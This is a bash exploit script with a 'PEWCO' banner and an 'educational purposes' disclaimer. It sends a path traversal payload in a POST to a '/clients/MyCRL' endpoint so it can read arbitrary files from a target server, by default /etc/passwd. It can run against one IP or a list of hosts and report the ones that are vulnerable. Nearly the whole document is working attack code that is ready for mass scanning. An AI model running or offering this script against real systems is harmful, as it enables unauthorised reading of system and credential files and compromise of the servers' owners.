#!/bin/bash
purple='\033[0;35m'
end='\033[0m'

function logo() {
	echo -e "${purple}"
	echo -e "\t ____  ____  _    _  ___  ___  "
	echo -e "\t(  _ \( ___)( \/\/ )/ __)/ _ \ "
	echo -e "\t )___/ )__)  )    (( (__( (_) )"
	echo -e "\t(__)  (____)(__/\__)\___)\___/ "
	echo
	echo -e " [I] This script has been made only for educational purposes"
	echo -e " [I] Use it under your responsibility."
	echo -e "${end}"
	sleep 1
}

function usage() {
	echo "Usage: $0 -i <ip> [-p <path, default=/etc/passwd>] [-f <file_path>]"
	exit 1
}

path="/etc/passwd"
logo

# Parse command line arguments
while getopts ":i:p:f:" opt; do
	case $opt in
	i)
		ip=$OPTARG
		;;
	p)
		path=$OPTARG
		;;
	f)
		file=$OPTARG
		;;
	*)
		usage
		;;
	esac
done

USER_AGENT='Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0'
data="aCSHELL/../../../../../../../../../../..${path}"

function post() {
	local host="$1"
	local target="https://${host}/clients/MyCRL"
	response=$(curl -s -X POST \
		-H "Host: ${host}" \
		-H "User-Agent: ${USER_AGENT}" \
		-H "Te: trailers" \
		-H "Dnt: 1" \
		-H "Connection: keep-alive" \
		--data "${data}" \
		--write-out "HTTPSTATUS:%{http_code}" \
		--insecure \
		"${target}")

	body=$(echo "$response" | sed -e 's/HTTPSTATUS\:.*//g')
	status_code=$(echo "$response" | tr -d '\n' | sed -e 's/.*HTTPSTATUS://')

	# Check if the status code is 200 (OK)
	if [ "$status_code" -eq 200 ]; then
		echo -e "${purple}Vulnerable: ${host} ${end}"
		echo "$body"
	else
		echo "Request failed with status code: $status_code"
	fi
}

# Check if the file argument is provided
if [ -n "$file" ]; then
	# Check if the file exists
	if [ ! -f "$file" ]; then
		echo "File not found: $file"
		exit 1
	fi
	while IFS= read -r line; do
		post "$line"
	done <"$file"
else
	if [ -z "$ip" ]; then
		echo "Missing -i (IP address)"
		usage
	else
		post "$ip"
	fi
fi
